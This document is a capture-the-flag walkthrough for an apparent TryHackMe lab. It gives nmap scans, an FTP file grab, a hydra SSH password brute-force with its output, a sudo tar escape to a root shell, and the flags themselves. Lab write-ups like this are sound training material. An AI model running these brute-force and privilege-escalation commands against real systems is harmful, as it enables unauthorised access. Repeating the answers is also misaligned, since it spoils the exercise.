# Living up to the title.

## Notes
```
nmap -sV $IP
Host is up (0.29s latency).
Not shown: 967 filtered ports, 32 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

nmap $IP
Nmap scan report for 10.10.179.167
Host is up (0.31s latency).
Not shown: 967 filtered ports, 30 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

## Questions
1. Who wrote the task list?
```
connect to ftp get task.txt

lin
```

2. What service can you bruteforce with the text file found?
```
looking at locks.txt we can bruteforce ssh

ssh
```

3. What is the users password? 
```
hydra -l lin -P bounty_hacker/locks.txt -t 6 ssh://$IP

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-19 20:27:29
[DATA] max 6 tasks per 1 server, overall 6 tasks, 26 login tries (l:1/p:26), ~5 tries per task
[DATA] attacking ssh://10.10.179.167:22/
[22][ssh] host: 10.10.179.167   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-19 20:27:39

RedDr4gonSynd1cat3
```

4. user.txt
```
ssh using lin

THM{CR1M3_SyNd1C4T3}
```

5. root.txt
```
sudo -l
gtfobin for tar #Sudo section
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

THM{80UN7Y_h4cK3r}
```